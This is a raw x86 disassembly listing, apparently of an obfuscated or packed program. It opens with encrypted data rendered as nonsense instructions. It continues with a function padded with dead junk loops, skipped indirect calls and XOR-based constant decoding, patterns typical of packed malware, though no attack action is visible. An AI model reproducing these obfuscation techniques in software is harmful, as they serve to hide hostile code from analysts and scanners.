  411a1c:	sub    ecx,DWORD PTR [edi-0x167a74bf]
  411a22:	pop    esi
  411a23:	(bad)  
  411a25:	in     eax,dx
  411a26:	lea    esi,[eax-0x1a]
  411a29:	js     0x4119d8
  411a2b:	rcl    WORD PTR [ebp-0x41],0x34
  411a30:	ret    
  411a31:	aam    0x82
  411a33:	out    0xf8,al
  411a35:	fst    QWORD PTR [edx+0x1c]
  411a38:	scas   eax,DWORD PTR es:[edi]
  411a39:	xor    ecx,0x5469821f
  411a3f:	fcom   QWORD PTR [edx+ecx*8-0x21c6b15]
  411a46:	mov    dl,0x9f
  411a48:	fmul   DWORD PTR [esi+0x3b]
  411a4b:	push   esp
  411a4c:	cs xchg esp,eax
  411a4e:	dec    edx
  411a4f:	inc    esi
  411a50:	pop    esi
  411a51:	imul   DWORD PTR [ebp-0xa]
  411a54:	dec    esi
  411a55:	gs mov cl,0xdc
  411a58:	addr16 sub eax,0x2a3626a4
  411a5e:	repnz repz dec eax
  411a61:	fnstcw WORD PTR [ecx]
  411a63:	inc    eax
  411a64:	pop    ds
  411a65:	jle    0x411a60
  411a67:	es das 
  411a69:	rol    BYTE PTR [ecx-0x694b4c5],1
  411a6f:	or     BYTE PTR [esi-0xe],ch
  411a72:	fimul  WORD PTR [edx-0x6d11538a]
  411a78:	das    
  411a79:	aam    0xd2
  411a7b:	jp     0x411a8e
  411a7d:	enter  0xa870,0x96
  411a81:	out    dx,eax
  411a82:	push   esi
  411a83:	xor    al,0x25
  411a85:	pop    esi
  411a86:	repz mov ds:0x35c200ea,al
  411a8c:	fidivr WORD PTR [ebp-0x5e7374da]
  411a92:	xor    BYTE PTR [edx],bh
  411a94:	or     edi,DWORD PTR [eax+eiz*1]
  411a97:	rcl    BYTE PTR [edx],cl
  411a99:	out    0x5a,al
  411a9b:	pusha  
  411a9c:	and    al,BYTE PTR [ebx]
  411a9e:	loopne 0x411a85
  411aa0:	mov    ecx,0x757586a1
  411aa5:	jl     0x411a85
  411aa7:	test   DWORD PTR [edx+0x3d0994e],ebx
  411aad:	dec    edx
  411aae:	(bad)  
  411aaf:	xor    BYTE PTR [eax+0x4b],bl
  411ab2:	stos   BYTE PTR es:[edi],al
  411ab3:	mov    ebp,0x95f9d176
  411ab8:	mov    ecx,esi
  411aba:	sbb    cl,BYTE PTR [ecx]
  411abc:	and    ebp,0x4b
  411abf:	mov    dh,0x10
  411ac1:	add    al,0xb7
  411ac3:	addr16 add edx,ecx
  411ac6:	jmp    0xc896:0x5c7c3c93
  411acd:	shr    DWORD PTR [ecx+0x732ebb65],1
  411ad3:	cli    
  411ad4:	aaa    
  411ad5:	cmp    ch,BYTE PTR [edi-0x1cdf2e64]
  411adb:	xor    ah,al
  411add:	jg     0x411adb
  411adf:	(bad)  
  411ae0:	jo     0x411a99
  411ae2:	mov    al,ds:0xc0483d36
  411ae7:	inc    ebx
  411ae8:	mov    eax,DWORD PTR [eax+0x4e28d08a]
  411aee:	pop    ss
  411aef:	(bad)  
  411af0:	or     eax,edx
  411af2:	mov    ebx,0x63198936
  411af7:	fist   WORD PTR [ecx+edi*2]
  411afa:	shl    DWORD PTR [esi-0x5c],cl
  411afd:	loopne 0x411add
  411aff:	imul   esi,DWORD PTR [edi],0x6bd70e93
  411b05:	fisttp WORD PTR [edx+0x43]
  411b08:	mov    al,0xb7
  411b0a:	xchg   edi,eax
  411b0b:	push   ds
  411b0c:	pop    ds
  411b0d:	mov    DWORD PTR [eax-0x70],edi
  411b10:	pop    ss
  411b11:	xchg   ebp,eax
  411b12:	stos   BYTE PTR es:[edi],al
  411b13:	xor    esi,DWORD PTR [eax]
  411b15:	sub    esp,DWORD PTR [ebx]
  411b17:	add    al,0x11
  411b19:	(bad)  
  411b1a:	aam    0xc2
  411b1c:	fwait
  411b1d:	sbb    BYTE PTR [esi+0x64],dl
  411b20:	jbe    0x411b5f
  411b22:	push   ecx
  411b23:	jb     0x411b15
  411b25:	popa   
  411b26:	or     cl,0x10
  411b29:	dec    esi
  411b2a:	ja     0x411b0c
  411b2c:	adc    bh,bl
  411b2e:	icebp  
  411b2f:	in     eax,dx
  411b30:	out    0x5,eax
  411b32:	icebp  
  411b33:	mov    cl,0xa6
  411b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b36:	jmp    0x411ada
  411b38:	js     0x411ac3
  411b3a:	xor    al,0x89
  411b3c:	in     eax,dx
  411b3d:	cmp    esp,esp
  411b3f:	sub    dl,0x6d
  411b42:	(bad)  
  411b43:	push   ecx
  411b44:	clc    
  411b45:	scas   eax,DWORD PTR es:[edi]
  411b46:	arpl   WORD PTR [ebp+ebp*4-0x6b],dx
  411b4a:	pop    es
  411b4b:	fisttp WORD PTR [esi-0x567a76a9]
  411b51:	lods   eax,DWORD PTR ds:[esi]
  411b52:	pop    DWORD PTR [esi]
  411b54:	frstor [esp+ecx*1+0x2a]
  411b58:	mov    ebx,0x4862154e
  411b5d:	xor    BYTE PTR [eax+ebx*8],ah
  411b60:	cmc    
  411b61:	aam    0xfd
  411b63:	and    BYTE PTR [esi+0x6e4d6e7b],dl
  411b69:	mov    ch,0xc5
  411b6b:	and    al,0xe7
  411b6d:	jle    0x411b10
  411b6f:	jne    0x411bb7
  411b71:	adc    DWORD PTR [esi],esi
  411b73:	call   0xed399308
  411b78:	js     0x411b88
  411b7a:	fcom   DWORD PTR [ebx-0x17]
  411b7d:	in     al,0x23
  411b7f:	fcomp  DWORD PTR [edi-0x75]
  411b82:	jb     0x411b6a
  411b84:	pop    ss
  411b85:	scas   al,BYTE PTR es:[edi]
  411b86:	stos   BYTE PTR es:[edi],al
  411b87:	std    
  411b88:	add    DWORD PTR [esi-0x3c],esp
  411b8b:	mov    eax,0x91024fc4
  411b90:	xor    bl,BYTE PTR ds:0x567a94c1
  411b96:	pushf  
  411b97:	xchg   edi,eax
  411b98:	or     BYTE PTR [ecx],dh
  411b9a:	icebp  
  411b9b:	jo     0x411bde
  411b9d:	pusha  
  411b9e:	lods   al,BYTE PTR ds:[esi]
  411b9f:	cmp    eax,0xf6d000a8
  411ba4:	xlat   BYTE PTR ds:[ebx]
  411ba5:	pop    ecx
  411ba6:	inc    ecx
  411ba7:	lods   al,BYTE PTR ds:[esi]
  411ba8:	mov    bl,0x8f
  411baa:	or     esi,DWORD PTR [ecx]
  411bac:	(bad)  
  411bad:	fsubr  QWORD PTR [ebx+0x5]
  411bb0:	push   ds
  411bb1:	dec    edx
  411bb2:	inc    esi
  411bb3:	das    
  411bb4:	mov    ch,0xa
  411bb6:	test   al,0x71
  411bb8:	cmc    
  411bb9:	pop    esp
  411bba:	fwait
  411bbb:	and    eax,edi
  411bbd:	lea    edx,[eax-0x4908b414]
  411bc3:	or     bh,ah
  411bc5:	mov    ebx,0x10952e26
  411bca:	adc    si,WORD PTR [ecx+esi*1]
  411bce:	or     DWORD PTR [edi-0x3d240fc3],0xffffffbd
  411bd5:	scas   eax,DWORD PTR es:[edi]
  411bd6:	push   edi
  411bd7:	fsub   QWORD PTR [esp+ecx*8-0x43ce20c0]
  411bde:	fmul   QWORD PTR [ecx-0x2a]
  411be1:	sahf   
  411be2:	mov    eax,ds:0x49f318fc
  411be7:	jns    0x411bbb
  411be9:	sub    BYTE PTR [esi],ch
  411beb:	add    al,0x8c
  411bed:	inc    edx
  411bee:	fimul  WORD PTR [ebx+0x46891075]
  411bf4:	or     BYTE PTR [ebx+0x758b1845],cl
  411bfa:	adc    BYTE PTR [ecx+0x458b0c46],cl
  411c00:	sbb    al,0x8b
  411c02:	jne    0x411c14
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
